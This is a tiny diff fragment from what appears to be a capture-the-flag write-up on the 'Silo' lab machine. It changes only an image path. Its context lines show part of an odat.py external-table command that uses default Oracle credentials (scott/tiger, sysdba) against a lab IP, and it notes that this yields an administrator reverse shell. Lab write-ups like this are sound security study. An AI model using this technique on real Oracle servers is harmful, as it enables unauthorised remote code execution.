@@ -83,4 +83,4 @@ $ ./odat.py externaltable -s 10.129.95.188 -p 1521 -d XE -U scott -P tiger --sys
 
 We would gain a reverse shell as the administrator.
 
-![](<../../../.gitbook/assets/image%20(3685).png>)
+![](../../../.gitbook/assets/silo.png)
